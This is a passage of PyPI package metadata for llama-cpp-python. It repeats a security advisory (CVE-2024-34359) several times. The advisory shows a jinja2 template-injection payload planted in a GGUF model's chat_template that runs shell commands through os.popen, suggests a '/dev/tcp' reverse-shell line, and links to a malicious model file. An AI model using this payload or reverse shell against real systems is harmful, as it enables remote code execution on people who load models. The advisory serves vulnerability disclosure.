ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.47":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.47/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.47","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b9af30371683d30a0485080448f0382ceec2272d1bce1a711904bb6a3cf3b38b","md5":"afc649667a52d750cce84a0cae565a2a","sha256":"cd1a46a70ec2d4be4c3b063e6824f8481790bd5081e934c9a85f534738d3cf62"},"downloads":-1,"filename":"llama_cpp_python-0.2.47.tar.gz","has_sig":false,"md5_digest":"afc649667a52d750cce84a0cae565a2a","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36861497,"upload_time":"2024-02-22T09:11:31","upload_time_iso_8601":"2024-02-22T09:11:31.832252Z","url":"https://files.pythonhosted.org/packages/b9/af/30371683d30a0485080448f0382ceec2272d1bce1a711904bb6a3cf3b38b/llama_cpp_python-0.2.47.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.48":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.48/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.48","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"2ecfab532896aa3837755dca592962552ae5c9114b71590bee2d959c57e97710","md5":"57aab40a9d5d62fb86d479aedfdd1346","sha256":"37294f14c3b8157334beb8c9b6d92087f2c9d82730d733e6fc4fc15034271dd8"},"downloads":-1,"filename":"llama_cpp_python-0.2.48.tar.gz","has_sig":false,"md5_digest":"57aab40a9d5d62fb86d479aedfdd1346","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36684347,"upload_time":"2024-02-23T09:56:25","upload_time_iso_8601":"2024-02-23T09:56:25.202256Z","url":"https://files.pythonhosted.org/packages/2e/cf/ab532896aa3837755dca592962552ae5c9114b71590bee2d959c57e97710/llama_cpp_python-0.2.48.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" 